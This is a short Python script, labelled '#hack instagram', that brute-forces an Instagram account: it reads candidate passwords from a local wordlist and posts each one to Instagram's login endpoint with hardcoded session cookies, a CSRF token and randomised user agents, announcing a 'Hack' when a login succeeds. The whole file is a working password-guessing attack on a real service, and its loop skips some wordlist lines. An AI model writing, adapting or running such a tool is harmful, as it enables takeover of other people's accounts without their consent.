import requests
from user_agent import generate_user_agent
import time

#hack instagram

user = input('[*]Enter user: ')

file = open("C:/Users/naplo/Desktop/password.txt", "r")

for ch in file:
    
    password = file.readline().split('\n')[0]



    url = 'https://www.instagram.com/accounts/login/ajax/'

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "ar,en-US;q=0.9,en;q=0.8",
        "content-length": "280",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": "mid=YGwT3gALAAG8H74LPjfv4TqDVNFh; ig_did=5F9FC938-65F7-42D0-9581-54713724A670; ig_nrcb=1; shbid=4892; shbts=1618711715.0621538; rur=ATN; csrftoken=lp2VTwXDuxWvcOIewSUSxKAe0fjh8MYZ",
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/",
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": generate_user_agent(),
        "x-csrftoken": "lp2VTwXDuxWvcOIewSUSxKAe0fjh8MYZ",
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "hmac.AR1jmLC3PYt-OgAK-1NBkqVoGLxRV1EWqWXvmUuBQ38bX4X5",
        "x-instagram-ajax": "8a8118fa7d40",
        "x-requested-with": "XMLHttpRequest"

    }



    data = {

        'username': user,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1618711766:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'

    }

    req = requests.post(url, headers=headers , data=data).text
    

    if '"authenticated":true' in req:
        print(f"Hack.. user:{user} pass:{password}")
        exit()

    elif '"authenticated":false' in req:
        print('No hacked !')
    time.sleep(3)
        

